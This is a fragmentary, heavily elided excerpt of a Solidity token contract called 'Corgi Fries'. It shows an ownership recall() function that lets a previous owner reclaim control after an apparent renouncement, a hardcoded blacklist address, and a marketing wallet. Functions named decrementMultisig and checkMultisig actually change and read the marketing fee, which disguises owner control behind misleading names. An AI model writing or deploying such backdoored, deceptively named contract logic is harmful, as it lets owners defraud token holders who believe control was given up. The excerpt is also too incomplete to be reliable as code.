...
contract Ownable is Context {
    ...
    */
    ...
    function recall() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to recall");
        require(now < _lockTime , "Contract is renounced");
...
contract CorgiFries is Context, IERC20, Ownable {
    ...
    string private _name = 'Corgi Fries';
    string private _symbol = 'CORGIFRIES';
    ...
    uint256 private _numOfTokensToExchangeForMarketing = 50000000000000000;
    ...
    function initContract() external onlyOwner() {
        ...
        _isSniper[address(0xA5e05593677761F371956c3612cedf0f2fC66Ac6)] = true;
        _confirmedSnipers.push(address(0xA5e05593677761F371956c3612cedf0f2fC66Ac6));
        
        _marketingAddress = payable(0xc8e3Bd63D3Eb65430dD92Ec03cDA96D96DD07B59);
    }
    ...
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeamDev) = _getTValues(tAmount, _taxFee, _marketingFee);
        uint256 currentRate =  _getRate();
    ...
    function setExtWallet(address payable marketingAddress) external onlyOwner() {
    ...
    function decrementMultisig() external onlyOwner() {
        if (_marketingFee > 0) {
            _marketingFee--;
        }
    }
    ...
    function checkMultisig() public view returns (uint256) {
